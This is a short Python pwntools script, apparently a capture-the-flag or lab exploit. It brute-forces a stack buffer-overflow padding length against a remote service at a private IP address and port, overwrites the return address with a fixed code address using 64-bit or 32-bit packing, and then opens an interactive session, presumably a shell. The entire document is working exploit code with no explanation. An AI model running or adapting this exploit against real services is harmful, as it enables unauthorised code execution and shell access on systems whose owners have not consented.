from pwn import *

context.log_level = 'debug'
addr = 0x40125a
addr1 = 0x4012d7
addr2 = 0x401354
def send(io,form,num):
    payload='a'*num
    if form == 1:
            payload+=p64(addr2)

    if form == 2:
            payload+=p32(addr2)
    io.sendlineafter('>',payload)

def exp():
    for j in range(2):
        for i in range(0x500):
            print 'i='+hex(i)+'  j='+str(j+1)
            io=remote('10.10.202.172',22004)
            try:
                send(io,j+1,i)
                print io.recv()
                io.interactive()
            except EOFError:
                io.close()

#exp()
padding = 0x268
io = remote('10.10.202.172',22004)
send(io,1,padding)
io.interactive()